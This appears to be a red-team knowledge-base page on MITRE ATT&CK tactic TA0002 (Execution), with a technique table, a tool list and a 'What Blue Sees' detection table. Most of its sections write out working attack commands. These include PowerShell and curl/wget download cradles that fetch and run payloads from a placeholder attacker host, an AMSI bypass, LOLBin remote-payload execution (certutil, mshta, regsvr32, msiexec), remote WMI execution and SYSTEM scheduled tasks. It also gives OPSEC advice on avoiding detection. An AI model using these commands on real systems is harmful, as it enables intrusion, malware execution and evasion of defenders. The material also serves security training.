---
type: tactic-hub
room: red
tactic: "Execution"
tactic_id: "TA0002"
tags: [red/execution, mitre/TA0002]
date_updated: {{date}}
---

# TA0002 — Execution

> [!quote]
> *"Once you eliminate the impossible, whatever remains, no matter how improbable, must be the truth."*
> — *The Sign of the Four*

**MITRE Reference:** [TA0002](https://attack.mitre.org/tactics/TA0002/) | **Kill Chain Phase:** Exploitation

The adversary is trying to run malicious code. You have your foothold — now you must make it do something. Execution is the moment the payload fires: the script runs, the binary launches, the macro triggers. Every technique here is a different ignition switch.

---

## Techniques in This Tactic

| Technique ID | Name | Prevalence |
|-------------|------|-----------|
| [[T1059 - Command and Scripting Interpreter]] | Command & Scripting Interpreter | ⭐⭐⭐⭐⭐ |
| [[T1203 - Exploitation for Client Execution]] | Exploitation for Client Execution | ⭐⭐⭐ |
| [[T1559 - Inter-Process Communication]] | Inter-Process Communication (COM/DDE) | ⭐⭐ |
| [[T1106 - Native API]] | Native API | ⭐⭐⭐ |
| [[T1053 - Scheduled Task Job]] | Scheduled Task / Job | ⭐⭐⭐⭐ |
| [[T1129 - Shared Modules]] | Shared Modules | ⭐⭐ |
| [[T1072 - Software Deployment Tools]] | Software Deployment Tools | ⭐⭐ |
| [[T1569 - System Services]] | System Services (sc.exe, PsExec) | ⭐⭐⭐⭐ |
| [[T1204 - User Execution]] | User Execution (malicious file/link) | ⭐⭐⭐⭐⭐ |
| [[T1047 - Windows Management Instrumentation]] | WMI | ⭐⭐⭐⭐ |

---

## The Standard Kit *(Tools)*

| Tool | Role | Platform |
|------|------|---------|
| `powershell` | Scripting + download cradle | Windows |
| `cmd.exe` | Command execution | Windows |
| `bash` / `sh` | Shell execution | Linux/macOS |
| `python3` | Scripting + payloads | All |
| `mshta.exe` | HTA execution (LOLBin) | Windows |
| `wscript.exe` / `cscript.exe` | VBScript / JScript | Windows |
| `certutil.exe` | Download cradle (LOLBin) | Windows |
| `regsvr32.exe` | Squiblydoo technique | Windows |
| `msiexec.exe` | MSI payload execution | Windows |
| `wmic.exe` | WMI execution | Windows |
| `crontab` | Scheduled execution | Linux |
| `schtasks.exe` | Scheduled tasks | Windows |

---

## Standard Execution Workflows

### PowerShell Execution (T1059.001)
```powershell
# Download and execute (download cradle)
IEX (New-Object Net.WebClient).DownloadString('http://<attacker>/payload.ps1')
IEX (IWR 'http://<attacker>/payload.ps1' -UseBasicParsing).Content

# Bypass execution policy
powershell -ExecutionPolicy Bypass -File payload.ps1
powershell -nop -w hidden -enc <base64_encoded_command>

# AMSI bypass (classic — patch before running)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Bash / Shell Execution (T1059.004)
```bash
# One-liner execution from web
curl -s http://<attacker>/payload.sh | bash
wget -qO- http://<attacker>/payload.sh | bash

# Execute dropped file
chmod +x ./payload && ./payload

# Background execution (detach from shell)
nohup ./payload &>/dev/null &
```

### WMI Execution (T1047)
```powershell
# Local WMI execution
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c payload.exe"

# Remote WMI execution
Invoke-WmiMethod -ComputerName <target> -Class Win32_Process -Name Create `
  -ArgumentList "cmd.exe /c payload.exe" -Credential (Get-Credential)

# From Linux (impacket)
wmiexec.py <domain>/<user>:<pass>@<target> "cmd /c whoami"
```

### Scheduled Task (T1053.005)
```cmd
rem Create a scheduled task for persistence + execution
schtasks /create /tn "SystemUpdate" /tr "C:\Temp\payload.exe" /sc onlogon /ru SYSTEM

rem Run immediately
schtasks /run /tn "SystemUpdate"

rem Query and delete
schtasks /query /tn "SystemUpdate"
schtasks /delete /tn "SystemUpdate" /f
```

### LOLBins — Living off the Land
```cmd
rem certutil — download from web
certutil -urlcache -f http://<attacker>/payload.exe C:\Temp\payload.exe

rem mshta — execute remote HTA
mshta http://<attacker>/payload.hta

rem regsvr32 — Squiblydoo (bypass AppLocker)
regsvr32 /s /n /u /i:http://<attacker>/payload.sct scrobj.dll

rem msiexec — execute remote MSI
msiexec /q /i http://<attacker>/payload.msi

rem rundll32 — execute DLL
rundll32.exe payload.dll,EntryPoint
```

---

## OPSEC Considerations

> [!warning] Execution Leaves Loud Tracks
> - PowerShell `IEX` + download cradle = **ScriptBlock logging catches everything** if enabled (Event 4104).
> - `-enc` flag is a well-known indicator — defenders search for it routinely.
> - LOLBins are monitored: `certutil`, `regsvr32`, `mshta` network connections are high-fidelity alerts.
> - WMI events survive reboots and are rarely reviewed — but Sysmon Event 20/21 catches subscriptions.
> - Prefer living-off-the-land over dropped binaries when AV/EDR is present.

---

## What Blue Sees

| Activity | Log Source | Event / Indicator |
|----------|-----------|-------------------|
| PowerShell IEX | PS ScriptBlock (4104) | `DownloadString`, `IEX`, `Invoke-Expression` |
| Encoded command | Security (4688) | `-enc` / `-EncodedCommand` in CLI |
| WMI process spawn | Sysmon 1 | `WmiPrvSE.exe` spawning child |
| schtasks creation | Security (4698) | New task with suspicious executable |
| LOLBin network | Sysmon 3 | `certutil.exe` / `mshta.exe` outbound |

---

## Related Notes

- [[TA0001 - Initial Access]] ← Feeds here
- [[TA0003 - Persistence]] ← Often paired
- [[TA0004 - Privilege Escalation]] ← What comes after

↩ [[Red - Notes]] · [[Red]] · [[Mind Palace]]
